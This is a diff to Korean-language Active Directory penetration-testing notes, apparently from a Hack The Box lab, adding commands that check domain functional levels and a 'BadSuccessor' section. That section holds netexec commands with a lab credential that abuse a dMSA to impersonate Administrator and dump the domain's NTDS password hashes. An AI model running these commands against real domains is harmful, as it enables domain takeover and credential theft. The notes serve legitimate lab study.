@@ -1,4 +1,37 @@
 <details>
+  <summary><strong>AD 기능 수준 확인</strong></summary>
+
+- `systeminfo`로 확인이 불가능할 때 도메인 및 포리스트 기능 수준을 확인하여 AD 환경의 최소 기능·호환성 기준을 간접적으로 확인.
+```
+Get-ADDomain | Select Name, DomainMode
+
+Get-ADForest | Select Name, ForestMode
+```
+  
+</details>
+
+---
+<details>
+  <summary><strong>BadSuccessor</strong></summary>
+
+- dMSA: 기존 서비스 계정을 자동 관리형 계정으로 안전하게 대체·이관하기 위해 Windows Server 2025에서 도입된 계정 유형
+- 공격자가 자신이 제어하는 dMSA를 Administrator의 정상적인 후계 계정인 것처럼 조작하여 Domain Admin 권한을 획득할 수 있었던 취약점
+- https://github.com/akamai/BadSuccessor
+```bash
+# OU 확인
+.\Get-BadSuccessorOUPermissions.ps1
+
+proxychains -q netexec ldap dc01.eighteen.htb -u adam.scott -p 'iloveyou1' -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' DMSA_NAME=0xdf TARGET_ACCOUNT=Administrator
+
+KRB5CCNAME=0xdf\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache
+
+KRB5CCNAME=0xdf\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache --ntds
+```
+  
+</details>
+
+---
+<details>
   <summary><strong>Logon Script</strong></summary>
 
 - 사용자가 컴퓨터에 로그인하는 순간 자동으로 환경을 세팅해주기 위해 사용.
